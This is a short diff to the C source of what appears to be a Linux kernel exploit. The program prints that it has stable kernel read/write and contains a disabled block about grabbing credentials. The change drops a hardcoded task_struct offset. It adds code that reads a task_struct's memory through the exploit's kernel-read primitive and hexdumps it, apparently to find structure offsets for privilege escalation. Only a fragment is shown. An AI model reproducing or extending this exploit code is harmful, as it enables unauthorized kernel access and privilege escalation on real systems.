@@ -30,7 +30,6 @@
 #include <sys/un.h>
 #include <errno.h>
 
-#define OFFSET__task_struct__mm 0x520
 #define MIN(x,y) ((x)<(y) ? (x) : (y))
 #define MAX(x,y) ((x)>(y) ? (x) : (y))
 
@@ -414,6 +413,10 @@ int main(int argc, char** argv) {
   setbuf(stdout, NULL);
   printf("should have stable kernel R/W now\n");
 
+  char task_struct_data[0x1000];
+  kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
+  hexdump_memory(task_struct_data, 0x1000);
+  printf("pid = %x\n", getpid());
   
 #if 0 // TODO
   /* in case you want to do stuff with the creds, to show that you can get them: */
